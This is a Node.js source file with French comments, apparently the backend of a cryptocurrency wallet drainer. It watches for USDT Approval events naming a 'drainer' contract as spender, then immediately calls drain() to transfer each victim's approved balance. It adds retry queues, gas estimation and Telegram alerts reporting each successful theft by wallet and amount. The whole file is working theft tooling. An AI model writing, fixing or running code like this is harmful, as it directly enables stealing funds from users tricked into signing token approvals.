/**
 * watcher.js — Surveillance on-chain des Approval events
 * ============================================================
 * Corrections :
 *   - withTimeout sur les appels RPC
 *   - Retry intelligent avec backoff en cas d'échec du drain
 *   - Nettoyage automatique de la queue après échecs répétés
 */

const { ethers } = require("ethers");
const fs         = require("fs");
const fsp        = fs.promises;
const path       = require("path");
const { nonceQueue } = require("./nonceQueue");

// ── Handler global unique ──────────────────────────────────────
process.on("unhandledRejection", (reason) => {
  console.error("[Process] ⚠ unhandledRejection:", reason?.message ?? reason);
});

// ── Timeout helper (idem serveur) ──────────────────────────────
const RPC_TIMEOUT_MS = 15_000;
function withTimeout(promise, ms = RPC_TIMEOUT_MS) {
  let timer;
  return Promise.race([
    promise,
    new Promise((_, reject) => {
      timer = setTimeout(() => reject(new Error("RPC timeout")), ms);
    }),
  ]).finally(() => clearTimeout(timer));
}

// ── ABI ────────────────────────────────────────────────────────
const USDT_ABI = [
  "event Approval(address indexed owner, address indexed spender, uint256 value)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function balanceOf(address) view returns (uint256)",
];
const DRAINER_ABI = [
  "function drain(address token, address from) external",
];

// ── Queue mémoire (source unique) ──────────────────────────────
const QUEUE_FILE = path.join(__dirname, "pending_drains.json");
let _memQueue = {};

async function initQueue() {
  try {
    const raw = await fsp.readFile(QUEUE_FILE, "utf8");
    _memQueue = JSON.parse(raw);
  } catch {
    _memQueue = {};
  }
}

function persistQueue() {
  fsp.writeFile(QUEUE_FILE, JSON.stringify(_memQueue, null, 2))
    .catch(e => console.error("[Watcher] ❌ persistQueue:", e.message));
}

function addToQueue(address, tokenAddress, allowance) {
  _memQueue[address.toLowerCase()] = {
    tokenAddress,
    allowance: allowance.toString(),
    addedAt: Date.now(),
    retries: 0,           // nouveau champ
  };
  persistQueue();
}

function removeFromQueue(address) {
  delete _memQueue[address.toLowerCase()];
  persistQueue();
}

function incrementRetries(address) {
  const entry = _memQueue[address.toLowerCase()];
  if (entry) {
    entry.retries = (entry.retries || 0) + 1;
    if (entry.retries >= 3) {
      console.log(`[Watcher] ❌ ${address} → 3 échecs, retiré de la queue`);
      delete _memQueue[address.toLowerCase()];
    }
    persistQueue();
  }
}

// ── Déduplication ──────────────────────────────────────────────
const processedTxHashes = new Set();
setInterval(() => {
  const n = processedTxHashes.size;
  processedTxHashes.clear();
  if (n > 0) console.log(`[Watcher] 🧹 Dédup purge (${n} entrées)`);
}, 6 * 60 * 60 * 1000);

// ── Telegram ───────────────────────────────────────────────────
async function notify(message) {
  const token  = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method : "POST",
      headers: { "Content-Type": "application/json" },
      body   : JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" }),
    });
  } catch (e) {
    console.error("[Watcher] ⚠ Telegram:", e.message);
  }
}

// ── waitForConfirmation (avec timeout) ─────────────────────────
async function waitForConfirmation(txHash, provider, maxAttempts = 30) {
  for (let i = 0; i < maxAttempts; i++) {
    try {
      const receipt = await withTimeout(provider.getTransactionReceipt(txHash));
      if (receipt) {
        if (receipt.status === 0) throw new Error("Approve tx reverted");
        return receipt;
      }
    } catch (e) {
      if (e.message.includes("reverted")) throw e;
    }
    await new Promise(r => setTimeout(r, 3_000));
  }
  throw new Error(`Timeout : ${txHash} non confirmé après ${maxAttempts * 3}s`);
}

// ── executeDrain (avec timeout + retry) ────────────────────────
async function executeDrain(owner, USDT_ADDRESS, drainerHttp, usdtReader, DRAINER_ADDRESS, wallet) {
  const currentAllowance = await withTimeout(
    usdtReader.allowance(owner, DRAINER_ADDRESS)
  );

  if (currentAllowance === 0n) {
    console.log(`[Watcher] ⏭  Allowance = 0 — ${owner}`);
    removeFromQueue(owner);
    return;
  }

  const formatted = ethers.formatUnits(currentAllowance, 6);
  console.log(`[Watcher] 💸 Drain ${formatted} USDT depuis ${owner}...`);

  let gasLimit;
  try {
    const est = await withTimeout(
      drainerHttp.drain.estimateGas(USDT_ADDRESS, owner)
    );
    gasLimit = est * 130n / 100n;
  } catch {
    gasLimit = 150_000n;
  }

  let drainTx;
  try {
    drainTx = await nonceQueue.send(wallet, (nonce) =>
      drainerHttp.drain(USDT_ADDRESS, owner, { gasLimit, nonce })
    );
  } catch (err) {
    console.error(`[Watcher] ❌ Envoi tx drain impossible pour ${owner}: ${err.message}`);
    incrementRetries(owner);
    return;
  }

  console.log(`[Watcher] 📤 Tx : ${drainTx.hash}`);

  // Attente de confirmation avec timeout
  try {
    const receipt = await withTimeout(drainTx.wait(), 60_000);
    if (receipt.status === 1) {
      console.log(`[Watcher] ✅ ${owner} | ${formatted} USDT | gas: ${receipt.gasUsed}`);
      console.log(`[Watcher]    https://etherscan.io/tx/${drainTx.hash}`);
      removeFromQueue(owner);
      await notify(
        `✅ <b>Drain réussi</b>\n` +
        `Wallet: <code>${owner}</code>\n` +
        `Montant: <b>${formatted} USDT</b>\n` +
        `<a href="https://etherscan.io/tx/${drainTx.hash}">Etherscan</a>`
      );
    } else {
      throw new Error("Transaction révertée");
    }
  } catch (err) {
    console.error(`[Watcher] ❌ Drain échoué ${owner}: ${err.message}`);
    incrementRetries(owner);
    await notify(`❌ <b>Drain échoué</b>\nWallet: <code>${owner}</code>\nErreur: ${err.message}`);

    // Retenter automatiquement après un délai si pas trop d'échecs
    const entry = _memQueue[owner.toLowerCase()];
    if (entry && entry.retries < 3) {
      const delay = Math.min(30_000 * (entry.retries + 1), 120_000);
      console.log(`[Watcher] 🔄 Nouvelle tentative pour ${owner} dans ${delay / 1000}s`);
      setTimeout(() => {
        executeDrain(owner, USDT_ADDRESS, drainerHttp, usdtReader, DRAINER_ADDRESS, wallet)
          .catch(e => console.error(`[Watcher] Retry auto ${owner}: ${e.message}`));
      }, delay);
    }
  }
}

// ── handleApproval (avec timeout) ──────────────────────────────
async function handleApproval({
  owner, value, event,
  USDT_ADDRESS, DRAINER_ADDRESS,
  usdtReader, drainerHttp, wallet
}) {
  const txHash = event?.log?.transactionHash ?? event?.transactionHash;
  if (!txHash) {
    console.warn(`[Watcher] ⚠  Approval sans txHash — owner: ${owner}`);
    return;
  }

  if (value === 0n) {
    console.log(`[Watcher] ⏭  Reset ignoré — ${owner}`);
    return;
  }

  if (processedTxHashes.has(txHash)) {
    console.log(`[Watcher] ⏭  Doublon — ${txHash.slice(0, 14)}...`);
    return;
  }
  processedTxHashes.add(txHash);

  console.log(`\n[Watcher] 🔔 Approval : ${owner} → ${ethers.formatUnits(value, 6)} USDT | tx: ${txHash}`);

  addToQueue(owner, USDT_ADDRESS, value);

  try {
    await waitForConfirmation(txHash, usdtReader.runner.provider);
    await executeDrain(owner, USDT_ADDRESS, drainerHttp, usdtReader, DRAINER_ADDRESS, wallet);
  } catch (err) {
    console.error(`[Watcher] ❌ handleApproval ${owner}: ${err.message}`);
    incrementRetries(owner);
  }
}

// ── startWatcher (inchangé, mais avec les nouveaux imports) ─────
async function startWatcher() {
  const WS_URL          = process.env.WS_RPC_URL;
  const HTTP_URL        = process.env.RPC_URL;
  const USDT_ADDRESS    = process.env.USDT_ADDRESS;
  const DRAINER_ADDRESS = process.env.DRAINER_ADDRESS;
  const PRIVATE_KEY     = process.env.PRIVATE_KEY;

  if (!WS_URL) {
    console.warn("[Watcher] ⚠  WS_RPC_URL non défini — watcher désactivé");
    return;
  }

  await initQueue();

  const httpProvider = new ethers.JsonRpcProvider(HTTP_URL);
  const wallet       = new ethers.Wallet(PRIVATE_KEY, httpProvider);
  const usdtReader   = new ethers.Contract(USDT_ADDRESS, USDT_ABI, httpProvider);
  const drainerHttp  = new ethers.Contract(DRAINER_ADDRESS, DRAINER_ABI, wallet);

  let retryDelay = 3_000;
  const MAX_DELAY = 60_000;

  // Retry initial des drains en attente
  const pendingAddrs = Object.keys(_memQueue);
  if (pendingAddrs.length > 0) {
    console.log(`[Watcher] 🔄 ${pendingAddrs.length} drain(s) en attente — retry en arrière-plan`);
    setImmediate(async () => {
      for (const addr of pendingAddrs) {
        await executeDrain(addr, USDT_ADDRESS, drainerHttp, usdtReader, DRAINER_ADDRESS, wallet)
          .catch(e => console.error(`[Watcher] ❌ Retry initial ${addr}: ${e.message}`));
      }
    });
  }

  async function connect() {
    try {
      const wsProvider   = new ethers.WebSocketProvider(WS_URL);
      const usdtListener = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wsProvider);

      let lastBlockTs = Date.now();
      let heartbeat;

      wsProvider.on("block", () => { lastBlockTs = Date.now(); });

      function startHeartbeat() {
        clearInterval(heartbeat);
        heartbeat = setInterval(() => {
          const elapsed = Date.now() - lastBlockTs;
          if (elapsed > 90_000) {
            console.warn(`[Watcher] 🔌 Pas de bloc depuis ${Math.round(elapsed / 1000)}s`);
            clearInterval(heartbeat);
            usdtListener.removeAllListeners();
            wsProvider.destroy().catch(() => {});
            nonceQueue.reset();
            scheduleReconnect();
          }
        }, 30_000);
      }

      wsProvider.on("error", (err) => {
        console.error("[Watcher] ❌ WS error:", err.message);
        clearInterval(heartbeat);
        usdtListener.removeAllListeners();
        wsProvider.destroy().catch(() => {});
        nonceQueue.reset();
        scheduleReconnect();
      });

      usdtListener.on(
        usdtListener.filters.Approval(null, DRAINER_ADDRESS),
        async (owner, _spender, value, event) => {
          try {
            await handleApproval({
              owner, value, event,
              USDT_ADDRESS, DRAINER_ADDRESS,
              usdtReader, drainerHttp, wallet,
            });
          } catch (err) {
            console.error("[Watcher] ❌ Listener:", err.message);
          }
        }
      );

      startHeartbeat();
      setTimeout(() => { retryDelay = 3_000; }, 30_000);
      console.log(`[Watcher] ✅ En écoute — spender == ${DRAINER_ADDRESS}`);

    } catch (err) {
      console.error(`[Watcher] ❌ Connexion WS: ${err.message}`);
      scheduleReconnect();
    }
  }

  function scheduleReconnect() {
    console.log(`[Watcher]    Reconnexion dans ${retryDelay / 1000}s...`);
    setTimeout(() => connect().catch(console.error), retryDelay);
    retryDelay = Math.min(retryDelay * 2, MAX_DELAY);
  }

  connect().catch(console.error);
}

module.exports = { startWatcher };